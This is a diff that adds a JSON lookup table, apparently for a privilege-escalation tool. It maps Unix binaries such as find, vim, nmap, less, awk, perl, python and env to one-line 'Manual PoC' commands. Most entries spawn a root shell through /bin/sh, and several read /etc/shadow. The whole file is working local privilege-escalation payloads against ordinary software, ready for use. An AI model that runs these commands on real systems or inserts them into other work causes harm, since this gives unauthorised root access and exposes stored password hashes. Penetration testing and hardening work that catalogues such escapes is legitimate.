@@ -1,0 +1,15 @@
+{
+  "find": "Manual PoC: find . -exec /bin/sh \\; -quit",
+  "vim": "Manual PoC: vim -c ':!/bin/sh'",
+  "nmap": "Manual PoC: nmap --interactive (or --script)",
+  "bash": "Manual PoC: bash -p",
+  "less": "Manual PoC: less /etc/shadow -> !/bin/sh",
+  "more": "Manual PoC: more /etc/shadow -> !/bin/sh",
+  "nano": "Manual PoC: nano -> R_FILE=/etc/shadow",
+  "awk": "Manual PoC: awk 'BEGIN {system(\"/bin/sh\")}'",
+  "perl": "Manual PoC: perl -e 'exec \"/bin/sh\";'",
+  "python": "Manual PoC: python -c 'import os; os.system(\"/bin/sh\")'",
+  "python3": "Manual PoC: python3 -c 'import os; os.system(\"/bin/sh\")'",
+  "ruby": "Manual PoC: ruby -e 'exec \"/bin/sh\"'",
+  "env": "Manual PoC: env /bin/sh"
+}
